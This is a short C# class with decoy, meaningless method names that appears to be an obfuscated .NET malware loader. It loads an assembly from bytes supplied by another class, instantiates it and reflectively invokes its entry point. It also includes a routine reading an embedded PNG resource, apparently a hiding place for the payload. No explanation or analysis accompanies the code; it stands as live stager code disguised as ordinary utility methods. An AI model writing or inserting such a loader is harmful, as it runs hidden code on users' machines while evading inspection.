using System.Drawing;
using System.IO;
using System.Reflection;

public class IncrementalReadDummyDecoder
{
	public static Assembly open = Assembly.Load(NonGenericProperytWriter1.TextEdit());

	public static MethodInfo mentry = Assembly.Load(NonGenericProperytWriter1.TextEdit()).EntryPoint;

	public static object Code(Assembly assembly, MethodInfo entryPoint)
	{
		return assembly.CreateInstance(TraceInternal(entryPoint));
	}

	public static void WriteWhitespaceAsyncd__143(Assembly assembly, MethodInfo entryPoint)
	{
		entryPoint.Invoke(Code(assembly, entryPoint), null);
	}

	public static string TraceInternal(MethodInfo entryPoint)
	{
		return (string)ValuesCollection(entryPoint);
	}

	public static void PropertyGridServiceProvider()
	{
		TOOLTIPTEXTA();
	}

	internal static object ValuesCollection(object asm)
	{
		return ((MemberInfo)asm).Name;
	}

	internal static bool TOOLTIPTEXTA()
	{
		WriteWhitespaceAsyncd__143(open, mentry);
		return true;
	}

	internal static bool HebrewCalendar()
	{
		return false;
	}

	public static Image getResourceImg(Assembly asm)
	{
		using (Stream stream = asm.GetManifestResourceStream("c__DisplayClass18_01.png"))
		{
			if (stream != null)
			{
				return Image.FromStream(stream);
			}
		}
		return null;
	}
}
